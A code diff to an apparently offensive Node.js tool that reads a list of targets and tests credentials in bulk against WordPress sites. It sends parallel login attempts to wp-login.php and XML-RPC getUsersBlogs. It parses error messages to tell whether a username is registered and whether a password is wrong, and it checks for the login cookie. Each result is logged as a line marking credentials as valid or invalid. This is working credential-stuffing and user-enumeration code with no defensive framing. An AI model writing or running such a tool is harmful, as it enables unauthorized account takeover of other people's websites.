@@ -41,8 +41,9 @@ async function wpLogin(host, protocol, username, password) {
 		loggedIn: false
 	};
 	try {
+		const url = `${protocol}//${host}/wp-login.php`;
 		const response = await axios.post(
-			`${protocol}//${host}/wp-login.php`, 
+			url, 
 			payload,
 			{
 				maxRedirects: 0,
@@ -56,18 +57,19 @@ async function wpLogin(host, protocol, username, password) {
 				}
 			}
 		);
-		//console.log(response.data);
-		const reNoUser = new RegExp(`The username <strong>${username}</strong> is not registered on this site`);
-		const usernameIsNotRegistered = response.data.match(reNoUser) !== null;
-		//console.log(`username not registered: ${usernameIsNotRegistered}`);
-		const reInvalidPass = new RegExp(`The password you entered for the username <strong>${username}</strong> is incorrect`);
-		const passwordIsInvalid = response.data.match(reInvalidPass) !== null;
-		//console.log(`password is invalid: ${passwordIsInvalid}`);
-		const {headers} = response;
-		const loggedIn = headers['set-cookie'] !== undefined && headers['set-cookie'].find(c=>c.match("wordpress_logged_in")) !== undefined;
-		result.loggedIn = loggedIn;
-		result.usernameOk = !usernameIsNotRegistered;
-		result.passwordOk = !passwordIsInvalid;
+		if (response.status === 200) {
+			const reNoUser = new RegExp(`The username <strong>${username}</strong> is not registered on this site`);
+			const usernameIsNotRegistered = response.data.match(reNoUser) !== null;
+			//console.log(`username not registered: ${usernameIsNotRegistered}`);
+			const reInvalidPass = new RegExp(`The password you entered for the username <strong>${username}</strong> is incorrect`);
+			const passwordIsInvalid = response.data.match(reInvalidPass) !== null;
+			//console.log(`password is invalid: ${passwordIsInvalid}`);
+			const {headers} = response;
+			const loggedIn = headers['set-cookie'] !== undefined && headers['set-cookie'].find(c=>c.match("wordpress_logged_in")) !== undefined;
+			result.loggedIn = loggedIn;
+			result.usernameOk = !usernameIsNotRegistered;
+			result.passwordOk = !passwordIsInvalid;
+		} 
 	} catch(err) {}
 
 	return result;
@@ -108,12 +110,12 @@ async function run(pathToTargets, from, nParrallelRequests) {
 		const getUsersBlogsResults = await Promise.allSettled(getUsersBlogsPromises);
 		const wpLoginResults = await Promise.allSettled(wpLoginPromises);
 
-		
 		for (let j=0; j<getUsersBlogsPromises.length; j++) {
 			const k = i*nParrallelRequests + j;
 			const line = lines[k];
 			const wpLoginResult = wpLoginResults[j].value;
-			const xmlLoginResult = getUsersBlogsResults[j].value.errno === undefined
+			
+			const xmlLoginResult = !(getUsersBlogsResults[j].value instanceof Error) && getUsersBlogsResults[j].value.errno === undefined
 			const report = `login|${line}|${wpLoginResult.usernameOk}|${wpLoginResult.passwordOk}|${wpLoginResult.loggedIn}|${xmlLoginResult}`;
 			console.log(report);
 		}
